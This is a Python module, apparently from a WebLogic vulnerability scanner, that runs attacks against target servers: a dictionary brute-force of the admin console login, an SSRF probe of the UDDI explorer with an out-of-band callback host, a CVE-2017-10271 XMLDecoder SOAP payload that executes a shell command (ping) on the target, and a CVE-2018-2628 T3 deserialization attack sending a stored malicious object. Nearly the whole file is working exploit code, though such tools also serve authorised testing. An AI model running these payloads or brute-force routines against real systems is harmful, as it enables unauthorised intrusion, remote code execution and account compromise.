# -*- coding: utf-8 -*-
# @Author: kingkk
# @Date:   2018-11-06 19:31:09
# @Last Modified by:   King kaki
# @Last Modified time: 2018-11-08 18:33:35
import requests
import re
import time
import socket
import base64
import warnings
from config import TIMEOUT
from .display import *
import sys
warnings.filterwarnings("ignore")


def weakpass(host, port):
	up_list = []
	url = 'http://{}:{}/console/j_security_check'.format(host, port)
	headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
	}

	with open("dict/weakpass.txt","r") as f:
		for up in f.readlines():
			if up == '\n':
				continue
			else:
				up_list.append(tuple(up.strip().split(":")))

	for user, passwd in up_list:	
		data = {'j_username': user, 'j_password': passwd}
		r = requests.post(url, data=data, headers=headers,timeout=TIMEOUT)

		info('[*] weakpass test - {}:{}'.format(user, passwd), end="\r")
		if r.text.count('Home Page') != 0 or r.text.count('WebLogic Server Console') != 0 or r.text.count('console.portal') != 0:
			success('[+] weak passwd!: {}:{} - {}:{}'.format(host, port, user, passwd))
			return
	info('[*] weakpass failed - {}:{}\t'.format(host, port))


def console(target):
	host, port = target.split(":")
	if int(port) == 443:
		url = 'https://{}/console/login/LoginForm.jsp'.format(host)
	else:
		url = 'http://{}:{}/console/login/LoginForm.jsp'.format(host, port)
	headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
	}

	r = requests.get(url, headers=headers, timeout=TIMEOUT)

	
	if r.status_code == 200 and 'Oracle WebLogic Server 管理控制台' in r.text and 'Oracle 是 Oracle Corporation 和/或其子公司的注册商标' in r.text:
		success('[+] console find: {}'.format(target))
		weakpass(host, port)
	else:
		info('[-] console not find: {}'.format(target))





def uuid_SSRF(target):
	from config import server
	host, port = target.split(":")
	if int(port) == 443:
		url = 'https://{}/uddiexplorer/SearchPublicRegistries.jsp'.format(host)
	else:
		url = 'http://{}:{}/uddiexplorer/SearchPublicRegistries.jsp'.format(host, port)

	headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
	}
	server_host = re.search(r'https?://([^/]+)', server)
	try:
		server_host = server_host.group(1)
	except:
		server_host = server
	params = {
		"operator":"http://{}.{}".format(host, server_host),
		"rdoSearch":"name",
		"txtSearchname":"sdf",
		"selfor":"Business+location",
		"btnSubmit":"Search"
	}


	r = requests.get(url, params=params,verify=False, headers=headers, timeout=TIMEOUT)

	# 页面发现
	# if 'Oracle WebLogic Server' in r.text and r.status_code == 200:
	# 	print('[x] pagefind: {}'.format(url))
	primary("[+] uuid_ssrf: {}".format(target))

def CVE_2017_10271(target):
	from config import server
	host, port = target.split(":")
	if int(port) == 443:
		url = 'https://{}/wls-wsat/CoordinatorPortType'.format(host)

	else:
		url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(host, port)
	headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Content-Type": "text/xml",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
	}
	server_host = re.search(r'http://([^/]+)', server)
	try:
		server_host = server_host.group(1)
	except:
		server_host = server
	# print(server_host)
	data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>ping {}.{}</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>'''.format(host, server_host)


	r = requests.post(url, data=data,verify=False, headers=headers, timeout=TIMEOUT)

	# print(r.request.url)
	# print(r.request.headers)
	# print(r.request.body)
	primary("[+] CVE wls-wsat: {}".format(target))

def CVE_2018_2628(target):
	def t3handshake(sock,server_addr):
		try:
			sock.connect(server_addr)
			sock.send(base64.b64decode('dDMgMTIuMi4xCkFTOjI1NQpITDoxOQpNUzoxMDAwMDAwMAoK'))
			time.sleep(0.5)
			sock.recv(1024)
		except :
			pass

	def buildT3RequestObject(sock,port):
		try:
			with open('dict/CVE-2018-2628-data.txt', "r") as f:
				datas = [ data.strip() for data in f.readlines()]

			for d in datas:
				sock.send(base64.b64decode(d))
			time.sleep(0.5)
			recv_l = len(sock.recv(2048))
			if recv_l == 0:
				info('[-] CVE-2018-2628 recv {} :{} '.format(recv_l, target))
			else:
				success('[*] CVE-2018-2628 recv {} :{} '.format(recv_l, target))
		except:
			pass

	def sendEvilObjData(sock):
		with open("dict/CVE-2018-2628-evildata.txt", "r") as f:
			payload = base64.b64decode(f.read())

		try:
			sock.send(payload)
			time.sleep(1.5)
			sock.send(payload)
		except:
			pass
		res = b''
		try:
			for i in range(3):
				res += sock.recv(4096)
				time.sleep(0.1)
		except Exception as e:
			pass
		return res

	def checkVul(res,server_addr):
		# print(len(str(res)))
		p=re.findall('\\$Proxy[0-9]+', str(res), re.S)
		if len(p)>0:
			success('[+] CVE-2018-2628 vul: {}'.format(target))
		else:
			info('[-] CVE-2018-2628 not vul: {}'.format(target))

	host, port = target.split(":")
	port = int(port)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(TIMEOUT)
	server_addr = (host, port)
	t3handshake(sock,server_addr)
	buildT3RequestObject(sock,port)
	rs=sendEvilObjData(sock)
	checkVul(rs,server_addr)